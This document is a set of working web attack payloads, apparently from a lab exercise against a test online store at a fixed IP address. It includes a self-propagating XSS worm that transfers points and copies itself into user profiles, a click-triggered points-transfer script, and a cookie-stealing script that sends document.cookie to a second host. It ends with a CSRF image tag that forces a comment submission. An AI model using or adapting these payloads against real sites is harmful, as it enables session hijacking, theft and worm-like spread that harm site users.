## xss_selfProp.js
```markdown
<script id="selfProp">

var begin = "<script id=\"selfProp\">";
var internalCode = document.getElementById("selfProp").innerHTML;
var end = "</"+"script>";
var selfPropagatingCode = encodeURIComponent(begin+internalCode+end);
 
var urlRequest="http://114.70.37.212/~estore/cgi-bin/process_points_transfer.php?transferee=a&points=312"; 
var AjaxRequest = new XMLHttpRequest();
AjaxRequest.open("GET", urlRequest, true);
AjaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
AjaxRequest.setRequestHeader("Host", "114.70.37.212");
AjaxRequest.send();

var urlRequest="http://114.70.37.212/~estore/cgi-bin/process_personal_profile.php?profile="+selfPropagatingCode; 
var AjaxRequest = new XMLHttpRequest();
AjaxRequest.open("GET", urlRequest, true);
AjaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
AjaxRequest.setRequestHeader("Host", "114.70.37.212");
AjaxRequest.send();

</script>
```

## xss_points.js
```markdown
<script>
function xssRequest(pic){

window.open(pic.src);

var urlRequest="http://114.70.37.212/~estore/cgi-bin/process_points_transfer.php?transferee=a&points=312";

var AjaxRequest = new XMLHttpRequest();
AjaxRequest.open("GET", urlRequest, true);
AjaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
AjaxRequest.setRequestHeader("Host", "114.70.37.212");
AjaxRequest.send();
}
</script>

<img src="http://114.70.37.212/filesharing.jpg" alt="image" width="77" height="77" onclick="xssRequest(this)">
```

## xss_cookie.js
```markdown
<script>
function xssRequest(pic){

window.open(pic.src);

var begin =  "<script>";
var internalCode = location.href="http://114.70.37.214/hijack_cookie.php?info="+document.cookie;
var end = "</"+"script>";
var cookieHijackCode =  encodeURIComponent(begin + internalCode + end);

var urlRequest="http://114.70.37.212/process_update.php?newemail="+cookieHijackCode;
var AjaxRequest = new XMLHttpRequest();
AjaxRequest.open("GET", urlRequest, true);
AjaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
AjaxRequest.setRequestHeader("Host", "114.70.37.212");
AjaxRequest.send();
}
</script>


<img src="http://114.70.37.212/filesharing.jpg" alt="image" width="77" height="77" onclick="xssRequest(this)">
```

## csrf_forced_request
```markdown
<img src=http://114.70.37.212/~estore/cgi-bin/process_private_comments.php?comments=badsite&pic=basstard_history.jpg alt="csrfImage" width="75" height="75">
```

